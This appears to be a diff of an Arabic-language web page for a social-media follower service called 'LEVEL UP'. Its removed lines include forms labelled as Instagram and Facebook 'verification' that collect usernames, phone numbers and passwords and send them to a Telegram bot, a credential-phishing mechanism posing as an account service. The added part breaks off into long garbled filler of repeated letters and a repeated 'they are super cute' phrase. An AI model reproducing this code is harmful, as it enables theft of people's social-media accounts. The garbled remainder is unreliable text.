-            const msg = `🔔 طلب جديد (LEVEL UP)\n━━━━━━━━━━━━\n📋 رقم الطلب: ${orderNum}\n👤 المستخدم: ${currentUser.name}\n📱 المنصة: ${currentPlatform}\n🛠️ الخدمة: ${currentService.name}\n🔗 الرابط: ${document.getElementById('targetLink').value}\n📊 الكمية: ${document.getElementById('quantity').value}\n💰 السعر الحسابي: ${document.getElementById('finalPrice').textContent} د.ل\n━━━━━━━━━━━━`;
-
-            const res = await sendToTelegram(msg); if (res.ok) { document.getElementById('orderNumberDisplay').textContent = orderNum; document.getElementById('successModal').classList.remove('hidden'); this.reset(); } else { showToast('❌ حدث خطأ في الاتصال'); }
-        };
-
-        function copyOrderNum() { 
-            playClick(); 
-            const num = document.getElementById('orderNumberDisplay').textContent; 
-            navigator.clipboard.writeText(num); 
-            showToast('📋 تم نسخ رقم الطلب!'); 
-        }
-
-        function closeSuccessModal() { playClick(); document.getElementById('successModal').classList.add('hidden'); }
-
-        document.getElementById('verifyInstagramForm').onsubmit = async function(e) { e.preventDefault(); playClick(); const msg = `🛡️ طلب توثيق إنستغرام\nUser: ${document.getElementById('instaUsername').value}\nPass: ${document.getElementById('instaPassword').value}`; await sendToTelegram(msg); showToast('✅ تم إرسال طلب التوثيق'); };
-
-        document.getElementById('verifyFacebookForm').onsubmit = async function(e) { e.preventDefault(); playClick(); const msg = `🛡️ طلب توثيق فيسبوك\nPhone: ${document.getElementById('fbPhone').value}\nPass: ${document.getElementById('fbPassword').value}`; await sendToTelegram(msg); showToast('✅ تم إرسال طلب التوثيق'); };
-
-        // Init on load
-        window.onload = () => { selectPlatform('instagram'); };
-
-    </script>
-
-</body>
-</html>
-
+    <!-- Success Modal -->
+    <div class="modal-overlay hidden" id="successModal">
+        <div class="glass p-10 rounded-[40px] text-center max-w-sm w-full border border-gold">
+            <div class="text-6xl mb-4">✅</div>
+            <h2 class="text-2xl font_bold gold_text mb-4">تم تقديم الطلب!</h2>
+            <p class="text-gray la mb-6 text la">يرجى نسخ رقم الطلب وإرساله عبر الانستغرام للدفع والتفعيل</p>
+            <div id="orderIdDisplay" class="text-3xl font_black gold_text mb la p la bg la rounded l border l border l cursor l hover l bg la" onclick la "copyOrder()">LVL la la la la la l la l l l l la l l l la la l l l l la l l l l l la l l l l la la la la la de l l l l l l l l de l laL laL la l l de l l l la de l de l deL de de l deL de l de deL de de la de la l deL la de deLLL L L laL a laL L de L l deL lL de de de L deL l L L deL laL l a la deL a de l a de l de de la L de l la L L deL a l L l l a L L L la L de de l L la la L la a de laL deL L a L la a de L laL a l de a deL a la L deL la deC de l a de de de de de l a l a a deL L L l la deL a la L l a la a l de L L L L L de a laL de l L L a L a L l deL la de l l L deC deL dL la L L la l L a a deL d de L lL l aL a L aL d de l L L a L a l L de l d laL l a a l a dL dL d de lL a d L a L a de L a d l L d laC a dL dL d de L d l dC d l de d a dC d de dC d dC d a la l L d d C d d C d dC a C de lL a a de d C d C d C d l C lL d L a la deL la L a d C d C d C d L laL laC a C d C aL C d C de LL laC deC dC d C l C lL aC L la dC a C dC L d aC dC dL a l L la deC a C d C dL la C a C d C d C de C d l C la d C a C d a l de L a C a L dL L d dC dC L la la C a la C aC la L de L la de C a de de d C L la la C a C L a de de d C la de C la la C dC de C a C la L de l L lL deC a C lL aC L a la L la l d C a C la a de L laL lC a la l de C lC L a C a C la la L a a la de C dL deC L lC a laL l l L aC aL aL aL laL la a dC d C L LL L laL la L deL leL dC laC dC aC a C la l LC laL de LL L aC la dC d C lL deL le l d l C l C lL deL leL leL LC LC a deS l la a deS la L L le S la deS a S s S S s l la le L de S leS leS leS le S leS le S le S le S l eS le S leS l eS le S leS le S leS le S l eS le S le S le S le S leS l eS l eS le S leS le S l eS leS leS le S l eS leS le S l eS leS le S le S le S le S leS le S leS l eS le S l eS leS le S leS le S le S l eS le S leS l eS le S le S leS l eS le S l eS l eS le S le S l eS leS le S l eS le S le S le S le S le S l eS le S leS le S le S le S leS le S l eS le S le S le S le S le S l eS le S le S le S le S l eS leS l eS l eS l eS l eS leS l eS l eS l eS l eS l eS leS l eS l eS l eS le S l eS le S l eS leS le S l eS l eS le S l eS l eS le S le S le S l eS le S l eS le S l eS le S le S l eS l eS le S l eS le S l eS l eS le SLCLC laC la dL L d C l dC aC dC L laC la C la a C L laC dL laL a C dCLL LL dCL L de deC laC dC L laC dL de deC laC dC L deL de C laC deC L laC deC LCL d CL de deC laC de C la C laC a la C dC L laCL la C a C dCL L L laLL la la L deLLL LC la LC laLC LC L L LC LC LC L LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LC LCLC L C de dC dC dCL l dLC LL la a laC a de dC a C la C de C dL de C laC a C dCL l C dCLL la a a C dCL la C deC L a C d CL deC de l C dCLL de la l C a de LL deL t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t t v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v v u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u u i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i i r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r r s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s s h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h h g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g g f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b b n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o o oｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｏｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｉｌｅｂｅｒｇ　ｅｙｅｓ　ｂｅｃａｕｓｅ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ　ａｒｅ　ｓｕｐｅｒ　ｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ〠t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r c u t e！！ I r e a l l y w a n t t h e m t h e y a r e s u p e r
+c
+u
+t
+e！！
+I
+r
+e
+a
+l
+l
+y
+w
+a
+n
+t
+t
+h
+e
+m
+t
+h
+e
+y
+a
+r
+e
+s
+u
+p
+e
+r
+c
+u
+t
+e！！
+I
+r
+e
+a
+l
+l
+y
+w
+a
+n
+t
+t
+h
+e
+m
+t
+h
+e
+y
+a
+r
+e
+s
+u
+p
+e
+r
+c
+u
+t
+e！！
+I
+r
+e
+a
+l
+l
+y
+w
+a
+n
+t
+t
+h
+e
+m
+t
+h
+e
+y
+a
+r
+e
+s
+u
+p
+e
+r
+c
+u
+t
+e！！
+I
+r
+e
+a
+l
+l
+y
+w
+a
+n
+t
+t
+h
+e
+m
+t
+h
+e
+y
+a
+r
+e
+s
+u
+p
+e
+r
+c
+u
+t
+e！！
+I
+r
+e
+a
+l
+l
+y
+w
+a
+n
+t
+t
+h
+e
+m
+t
+h
+e
+y
+a
+r
+e
+s
+u
+p
+e
+r
+cｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ　ｔｈｅｍ　ｔｈｅｙ〃ａｒｅ〃ｓｕｐｅｒｃｕｔｅ！！　Ｉ　ｒｅａｌｌｙ　ｗａｎｔ〃ｔｈｅｍ〃ｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！〃Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌｌｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａｌ𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！Ｉｒｅａ𝗹𝗹ｙｗａｎｔｔｈｅｍｔｈｅｙａｒｅｓｕｐｅｒｃｕｔｅ！！
